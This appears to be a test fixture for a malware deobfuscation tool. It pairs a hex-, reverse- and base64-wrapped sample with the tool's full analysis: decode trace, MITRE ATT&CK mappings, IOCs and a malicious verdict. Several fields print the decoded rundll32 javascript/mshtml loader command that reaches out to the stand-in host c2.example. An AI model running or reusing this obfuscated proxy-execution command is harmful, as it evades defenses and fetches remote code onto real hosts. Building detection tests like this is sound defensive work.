@@ -1,0 +1,724 @@
+{
+  "sample_id": "R2_S10_rundll32_hex",
+  "wrap": "hex(b64(rev(P)))",
+  "input": "3d3d514b6c4e4862685a474c6967334c6c784763744647656c35694d6a39794c3641486430686d497349435646646b496f34575a77396d4c70494355555246534d31455775494462746833634e4a434b304e575a714a325459566d647052335942426a4d6c63585a7574544b6f554764704a336475516e626c3157646a39475a37494349753957613046325970784763774645544e52465375566e55737757623068326374786c4c75776c4936514863704a33597a466d64687047496c68585a75497a4d7378475a75566e63",
+  "input_sha1": "abbf92c0c72ec2f5c88eee486776ab2f517584ec",
+  "expected_plaintext": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"Msxml2.XMLHTTP\").open(\"GET\",\"http://c2.example/x\",false)",
+  "expected_token": "rundll32",
+  "http_ms": 13741,
+  "status": 200,
+  "response": {
+    "recipe": [
+      {
+        "op": "hex-decode",
+        "args": {},
+        "reason": "Hex-encoded printable payload"
+      },
+      {
+        "op": "reverse",
+        "args": {},
+        "reason": "Applied reverse"
+      },
+      {
+        "op": "base64-decode",
+        "args": {},
+        "reason": "Base64-encoded payload detected"
+      },
+      {
+        "op": "rundll32-annotate",
+        "args": {},
+        "reason": "Applied rundll32-annotate"
+      }
+    ],
+    "output": "# --- Rundll32 JavaScript/HTMLApplication Loader Detected ---\n# T1218.011 \u00b7 Signed Binary Proxy Execution: Rundll32\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"Msxml2.XMLHTTP\").open(\"GET\",\"http://c2.example/x\",false)\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nNIVXRAY INVESTIGATION SUMMARY\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  Engine:      smart+archetype:LOLBAS_RUNDLL32_JAVASCRIPT \u00b7 conf 100/100\n  Chain:       hex-decode \u2192 reverse \u2192 base64-decode \u2192 rundll32-annotate\n\n  MITRE ATT&CK\n    T1218.011    \u00b7 Defense Evasion\n    T1218.005    \u00b7 Defense Evasion\n    T1027        \u00b7 Defense Evasion\n\n  LOLBIN       rundll32.exe\n\n  IOCs\n    URL       http://c2.example/x\n    Domain    c2.example\n\n  Per-layer decoded outputs available in the Chain / Trace panel \u2191\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+    "notes": [
+      "Matched named wrapper archetype: Rundll32 JavaScript/HTMLApplication loader (T1218.011) \u2014 detects rundll32 javascript: or mshtml,RunHTMLApplication."
+    ],
+    "detected_type": {
+      "type": "url_encoded",
+      "label": "URL-encoded content detected"
+    },
+    "engine": "smart+archetype:LOLBAS_RUNDLL32_JAVASCRIPT",
+    "reached_shellcode": false,
+    "confidence": 100,
+    "trace": [
+      {
+        "op": "hex-decode",
+        "args": {},
+        "reason": "Hex-encoded printable payload",
+        "output_preview": "==QKlNHbhZGLig3LlxGctFGel5iMj9yL6AHd0hmIsICVFdkIo4WZw9mLpICUURFSM1EWuIDbth3cNJCK0NWZqJ2TYVmdpR3YBBjMlcXZutTKoUGdpJ3duQnbl1Wdj9GZ7ICIu9Wa0F2YpxGcwFETNRFSuVnUswWb0h2ctxlLuwlI6QHcpJ3YzFmdhpGIlhXZuIzMsxGZuVnc",
+        "output_length": 204,
+        "evidence": {
+          "encoding": "Hexadecimal ASCII",
+          "op": "hex-decode",
+          "length": 204,
+          "ascii": true,
+          "entropy": 5.573,
+          "hex_preview": "3d 3d 51 4b 6c 4e 48 62 68 5a 47 4c 69 67 33 4c \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      },
+      {
+        "op": "reverse",
+        "args": {},
+        "reason": "Applied reverse",
+        "output_preview": "cnVuZGxsMzIuZXhlIGphdmFzY3JpcHQ6IlwuLlxtc2h0bWwsUnVuSFRNTEFwcGxpY2F0aW9uICI7ZG9jdW1lbnQud3JpdGUoKTtuZXclMjBBY3RpdmVYT2JqZWN0KCJNc3htbDIuWE1MSFRUUCIpLm9wZW4oIkdFVCIsImh0dHA6Ly9jMi5leGFtcGxlL3giLGZhbHNlKQ==",
+        "output_length": 204,
+        "evidence": {
+          "encoding": "String reversal",
+          "op": "reverse",
+          "length": 204,
+          "ascii": true,
+          "entropy": 5.573,
+          "hex_preview": "63 6e 56 75 5a 47 78 73 4d 7a 49 75 5a 58 68 6c \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      },
+      {
+        "op": "base64-decode",
+        "args": {},
+        "reason": "Base64-encoded payload detected",
+        "output_preview": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"Msxml2.XMLHTTP\").open(\"GET\",\"http://c2.example/x\",false)",
+        "output_length": 151,
+        "evidence": {
+          "encoding": "Base64 (RFC 4648)",
+          "op": "base64-decode",
+          "length": 151,
+          "ascii": true,
+          "entropy": 5.203,
+          "hex_preview": "72 75 6e 64 6c 6c 33 32 2e 65 78 65 20 6a 61 76 \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      },
+      {
+        "op": "rundll32-annotate",
+        "args": {},
+        "reason": "Applied rundll32-annotate",
+        "output_preview": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"Msxml2.XMLHTTP\").open(\"GET\",\"http://c2.example/x\",false)",
+        "output_length": 151,
+        "evidence": {
+          "encoding": "rundll32-annotate",
+          "op": "rundll32-annotate",
+          "length": 151,
+          "ascii": true,
+          "entropy": 5.203,
+          "hex_preview": "72 75 6e 64 6c 6c 33 32 2e 65 78 65 20 6a 61 76 \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      }
+    ],
+    "chain_ids": [
+      "hex-decode",
+      "reverse",
+      "base64-decode",
+      "rundll32-annotate"
+    ],
+    "score": 100,
+    "custom_recipes_matched": [],
+    "boost": {
+      "enabled": true,
+      "signal_kind": "unknown",
+      "chain": [
+        "ps-join-char-array"
+      ],
+      "source": "history",
+      "confidence": 1.0,
+      "alternatives": [
+        {
+          "chain": [
+            "env-expand"
+          ],
+          "score": 40,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "extract-b64",
+            "utf16le-or-utf8-decode"
+          ],
+          "score": 38,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "base64-decode",
+            "gzip-decompress",
+            "download-shell-bg"
+          ],
+          "score": 30,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "extract-payload",
+            "base64-decode",
+            "xor",
+            "gzip-decompress"
+          ],
+          "score": 30,
+          "source": "history"
+        }
+      ],
+      "signals": {
+        "length": 408,
+        "length_bucket": "m",
+        "entropy": 3.45,
+        "b64_density": 1.0,
+        "has_powershell": false,
+        "has_encoded_cmd": false,
+        "has_iwr": false,
+        "has_downloadstr": false,
+        "has_gzip_prefix": false,
+        "has_zlib_prefix": false,
+        "has_utf16le_hint": true,
+        "has_curl_pipe": false,
+        "has_wget_pipe": false,
+        "has_bash_prefix": false,
+        "has_mshta": false,
+        "has_certutil": false,
+        "has_rundll32": false,
+        "has_regsvr32": false,
+        "has_hex_stream": false,
+        "has_unicode_esc": false,
+        "has_url_encoded": false,
+        "has_html_entities": false,
+        "has_defanged": false,
+        "has_reg_persist": false,
+        "has_charcode": false
+      }
+    },
+    "boost_hit": false,
+    "corrupted_container": null,
+    "reasoning": {
+      "mode": "balanced",
+      "input_profile": {
+        "kind": "encoded_blob",
+        "entropy": 3.45,
+        "length": 408,
+        "letter_ratio": 0.127,
+        "digit_ratio": 0.873,
+        "punct_ratio": 0.0,
+        "space_ratio": 0.0,
+        "non_printable_ratio": 0.0,
+        "upper_ratio": 0.0,
+        "priors": [
+          "hex-decode"
+        ],
+        "reasons": [
+          "hex-alphabet"
+        ]
+      },
+      "output_profile": {
+        "kind": "text_like",
+        "entropy": 5.403,
+        "length": 267,
+        "letter_ratio": 0.7,
+        "digit_ratio": 0.064,
+        "punct_ratio": 0.172,
+        "space_ratio": 0.064,
+        "non_printable_ratio": 0.0,
+        "upper_ratio": 0.193,
+        "priors": [
+          "rot-n-brute",
+          "atbash",
+          "reverse",
+          "xor-single-byte"
+        ],
+        "reasons": [
+          "text-shape"
+        ]
+      },
+      "input_linguistic_score": 0.0,
+      "output_linguistic_score": 0.9954,
+      "linguistic_delta": 0.9954,
+      "confidence": {
+        "confidence": 0.8188,
+        "band": "high",
+        "structural": 0.7,
+        "readability": 0.9959,
+        "entropy_sanity": 0.8,
+        "context": 0.75,
+        "weights": {
+          "structural": 0.3,
+          "readability": 0.3,
+          "entropy_sanity": 0.2,
+          "context": 0.2
+        },
+        "reasons": [
+          "structural: inferred-valid (printable=1.00)",
+          "readability: printable=1.00, linguistic=1.00",
+          "entropy: mixed-content-entropy=5.40",
+          "context: output-has-actionable-tokens"
+        ],
+        "dimensions": {
+          "structural": {
+            "score": 0.7,
+            "reason": "inferred-valid (printable=1.00)"
+          },
+          "readability": {
+            "score": 0.9959,
+            "reason": "printable=1.00, linguistic=1.00"
+          },
+          "entropy_sanity": {
+            "score": 0.8,
+            "reason": "mixed-content-entropy=5.40"
+          },
+          "context": {
+            "score": 0.75,
+            "reason": "output-has-actionable-tokens"
+          }
+        }
+      },
+      "explanation": "Chain [hex-decode \u2192 reverse \u2192 base64-decode \u2192 rundll32-annotate] substantially improved readability (\u0394=+0.995 linguistic score). Selected by evidence-based scoring: structural validity, printable ratio, English density, and analyst-keyword hits.",
+      "narrative": null,
+      "trace": null
+    },
+    "layer_trace": [
+      {
+        "layer": "L0",
+        "engine": "archetype",
+        "chain_len": 1,
+        "score": 1.0,
+        "verdict": "matched"
+      },
+      {
+        "layer": "L1",
+        "engine": "smart",
+        "chain_len": 0,
+        "score": 0.0,
+        "verdict": "skipped"
+      },
+      {
+        "layer": "L2",
+        "engine": "magic",
+        "chain_len": 0,
+        "score": 0.0,
+        "verdict": "skipped"
+      }
+    ],
+    "l3_metadata": null,
+    "layer_iocs": [
+      {
+        "layer": 3,
+        "op": "base64-decode",
+        "iocs": {
+          "urls": [
+            "http://c2.example/x"
+          ],
+          "ips": [],
+          "domains": [
+            "c2.example"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "rundll32.exe",
+            "purposes": [
+              "Execute",
+              "AWL Bypass"
+            ],
+            "mitre": [
+              "T1218.011"
+            ],
+            "description": "rundll32 abused to execute DLL exports, JavaScript, or shell handlers",
+            "snippet": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"Msxml2.XMLHTTP\").open(\"GET\",\"http://c2.example/x\",false)",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/rundll32/",
+            "source": "curated"
+          }
+        ]
+      },
+      {
+        "layer": 4,
+        "op": "rundll32-annotate",
+        "iocs": {
+          "urls": [
+            "http://c2.example/x"
+          ],
+          "ips": [],
+          "domains": [
+            "c2.example"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "rundll32.exe",
+            "purposes": [
+              "Execute",
+              "AWL Bypass"
+            ],
+            "mitre": [
+              "T1218.011"
+            ],
+            "description": "rundll32 abused to execute DLL exports, JavaScript, or shell handlers",
+            "snippet": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"Msxml2.XMLHTTP\").open(\"GET\",\"http://c2.example/x\",false)",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/rundll32/",
+            "source": "curated"
+          }
+        ]
+      }
+    ],
+    "analysis_mode": "balanced",
+    "verdict_card": {
+      "label": "Malicious",
+      "confidence": 70,
+      "reason": "URL surfaced in decoded output: http://c2.example/x.",
+      "indicators": [
+        {
+          "label": "Low entropy (5.40) \u2014 data is likely readable / ASCII text",
+          "kind": "neutral"
+        },
+        {
+          "label": "Hexadecimal ASCII layer peeled",
+          "kind": "neutral"
+        },
+        {
+          "label": "String reversal layer peeled",
+          "kind": "neutral"
+        },
+        {
+          "label": "Base64 (RFC 4648) layer peeled",
+          "kind": "neutral"
+        },
+        {
+          "label": "URL surfaced in decoded output: http://c2.example/x",
+          "kind": "positive"
+        }
+      ],
+      "recommended_action": "Contain source host, hunt for parent process, submit to sandbox / VirusTotal, and correlate URL / MITRE mapping."
+    },
+    "mode": "strict",
+    "risk": {
+      "verdict": "Malicious",
+      "level": "malicious",
+      "score": 70
+    },
+    "iocs": {
+      "urls": [
+        "http://c2.example/x"
+      ],
+      "ips": [],
+      "domains": [
+        "c2.example"
+      ],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "mitre": [
+      {
+        "id": "T1218.011",
+        "technique": "Rundll32",
+        "tactic": "Defense Evasion"
+      },
+      {
+        "id": "T1218.005",
+        "technique": "mshta-style javascript:/vbscript: URI fragment",
+        "tactic": "Defense Evasion"
+      },
+      {
+        "id": "T1027",
+        "technique": "Standalone long base64 blob (>=200 chars) \u2014 likely encoded payload",
+        "tactic": "Defense Evasion"
+      }
+    ],
+    "lolbas": [
+      {
+        "binary": "rundll32.exe",
+        "purposes": [
+          "Execute",
+          "AWL Bypass"
+        ],
+        "mitre": [
+          "T1218.011"
+        ],
+        "description": "rundll32 abused to execute DLL exports, JavaScript, or shell handlers",
+        "snippet": "Execution: Rundll32 rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"Msxml2.XMLHTTP\").open(\"GET\",\"http://c2.example/x\",false)",
+        "url": "https://lolbas-project.github.io/lolbas/Binaries/rundll32/",
+        "source": "curated"
+      }
+    ],
+    "ti_shield": [
+      {
+        "layer": 0,
+        "label": "L0 \u00b7 RAW INPUT",
+        "op": "raw",
+        "preview": "3d3d514b6c4e4862685a474c6967334c6c784763744647656c35694d6a39794c3641486430686d497349435646646b496f34575a77396d4c70494355555246534d31455775494462746833634e4a434b304e575a714a325459566d647052335942426a4d6c63585a7574544b6f554764704a336475516e626c3157646a39475a37494349753957613046325970784763774645544e52465375566e55737757623068326374786c4c75776c4936514863704a33597a466d64687047496c68585a75497a4d7378475a",
+        "iocs": {
+          "urls": [],
+          "ips": [],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [],
+        "mitre": [
+          {
+            "id": "T1027",
+            "technique": "Standalone long base64 blob (>=200 chars) \u2014 likely encoded payload",
+            "tactic": "Defense Evasion"
+          }
+        ],
+        "yara": [
+          {
+            "rule": "Base64_Long_Blob",
+            "severity": "low",
+            "match": "3d3d514b6c4e4862685a474c6967334c6c784763744647656c35694d6a39794c3641486430686d497349435646646b496f34575a77396d4c70494355",
+            "description": "Long Base64 blob"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 9,
+          "band": "none"
+        }
+      },
+      {
+        "layer": 3,
+        "label": "L3 \u00b7 BASE64-DECODE",
+        "op": "base64-decode",
+        "preview": "http://c2.example/x c2.example",
+        "iocs": {
+          "urls": [
+            "http://c2.example/x"
+          ],
+          "ips": [],
+          "domains": [
+            "c2.example"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "rundll32.exe",
+            "purposes": [
+              "Execute",
+              "AWL Bypass"
+            ],
+            "mitre": [
+              "T1218.011"
+            ],
+            "description": "rundll32 abused to execute DLL exports, JavaScript, or shell handlers",
+            "snippet": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"Msxml2.XMLHTTP\").open(\"GET\",\"http://c2.example/x\",false)",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/rundll32/",
+            "source": "curated"
+          }
+        ],
+        "mitre": [],
+        "yara": [
+          {
+            "rule": "PS_CaseMixed_Obfuscation",
+            "severity": "low",
+            "match": "example",
+            "description": "Alternating-case keyword obfuscation to evade string-signature detection"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {
+          "ips": [],
+          "domains": [
+            {
+              "value": "c2.example",
+              "classification": {
+                "tld": "example",
+                "is_high_risk_tld": false,
+                "is_onion": false,
+                "length": 10,
+                "has_dashes": false,
+                "num_subdomains": 0
+              },
+              "resolved_ips": [],
+              "urlscan": {
+                "total": 0,
+                "results": []
+              },
+              "otx": null
+            }
+          ],
+          "urls": [
+            {
+              "value": "http://c2.example/x",
+              "scheme": "http",
+              "host": "c2.example",
+              "path": "/x",
+              "port": null,
+              "is_onion": false,
+              "urlscan": {
+                "total": 0,
+                "results": []
+              },
+              "otx": {
+                "pulse_count": 0,
+                "reputation": null,
+                "pulses": []
+              }
+            }
+          ],
+          "hashes": [],
+          "sources_used": [
+            "ip-api.com (geolocation, no key)",
+            "system DNS (reverse lookup, resolution)",
+            "AbuseIPDB",
+            "URLScan.io",
+            "AlienVault OTX",
+            "Hybrid Analysis"
+          ]
+        },
+        "family_hint": null,
+        "severity": {
+          "score": 16,
+          "band": "low"
+        }
+      },
+      {
+        "layer": 4,
+        "label": "L4 \u00b7 RUNDLL32-ANNOTATE",
+        "op": "rundll32-annotate",
+        "preview": "http://c2.example/x c2.example",
+        "iocs": {
+          "urls": [
+            "http://c2.example/x"
+          ],
+          "ips": [],
+          "domains": [
+            "c2.example"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "rundll32.exe",
+            "purposes": [
+              "Execute",
+              "AWL Bypass"
+            ],
+            "mitre": [
+              "T1218.011"
+            ],
+            "description": "rundll32 abused to execute DLL exports, JavaScript, or shell handlers",
+            "snippet": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"Msxml2.XMLHTTP\").open(\"GET\",\"http://c2.example/x\",false)",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/rundll32/",
+            "source": "curated"
+          }
+        ],
+        "mitre": [],
+        "yara": [
+          {
+            "rule": "PS_CaseMixed_Obfuscation",
+            "severity": "low",
+            "match": "example",
+            "description": "Alternating-case keyword obfuscation to evade string-signature detection"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 16,
+          "band": "low"
+        }
+      },
+      {
+        "layer": "final",
+        "label": "L-FINAL \u00b7 DECODED PAYLOAD",
+        "op": "final",
+        "preview": "# --- Rundll32 JavaScript/HTMLApplication Loader Detected ---\n# T1218.011 \u00b7 Signed Binary Proxy Execution: Rundll32\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"Msxml2.XMLHTTP\").open(\"GET\",\"http://c2.example/x\",false)",
+        "iocs": {
+          "urls": [
+            "http://c2.example/x"
+          ],
+          "ips": [],
+          "domains": [
+            "c2.example"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "rundll32.exe",
+            "purposes": [
+              "Execute",
+              "AWL Bypass"
+            ],
+            "mitre": [
+              "T1218.011"
+            ],
+            "description": "rundll32 abused to execute DLL exports, JavaScript, or shell handlers",
+            "snippet": "Execution: Rundll32 rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"Msxml2.XMLHTTP\").open(\"GET\",\"http://c2.example/x\",false)",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/rundll32/",
+            "source": "curated"
+          }
+        ],
+        "mitre": [
+          {
+            "id": "T1218.011",
+            "technique": "Rundll32",
+            "tactic": "Defense Evasion"
+          },
+          {
+            "id": "T1218.005",
+            "technique": "mshta-style javascript:/vbscript: URI fragment",
+            "tactic": "Defense Evasion"
+          }
+        ],
+        "yara": [
+          {
+            "rule": "PS_CaseMixed_Obfuscation",
+            "severity": "low",
+            "match": "JavaScript",
+            "description": "Alternating-case keyword obfuscation to evade string-signature detection"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 26,
+          "band": "low"
+        }
+      }
+    ],
+    "output_raw": "# --- Rundll32 JavaScript/HTMLApplication Loader Detected ---\n# T1218.011 \u00b7 Signed Binary Proxy Execution: Rundll32\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"Msxml2.XMLHTTP\").open(\"GET\",\"http://c2.example/x\",false)",
+    "report_text": "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nNIVXRAY INVESTIGATION SUMMARY\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  Engine:      smart+archetype:LOLBAS_RUNDLL32_JAVASCRIPT \u00b7 conf 100/100\n  Chain:       hex-decode \u2192 reverse \u2192 base64-decode \u2192 rundll32-annotate\n\n  MITRE ATT&CK\n    T1218.011    \u00b7 Defense Evasion\n    T1218.005    \u00b7 Defense Evasion\n    T1027        \u00b7 Defense Evasion\n\n  LOLBIN       rundll32.exe\n\n  IOCs\n    URL       http://c2.example/x\n    Domain    c2.example\n\n  Per-layer decoded outputs available in the Chain / Trace panel \u2191\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"
+  }
+}
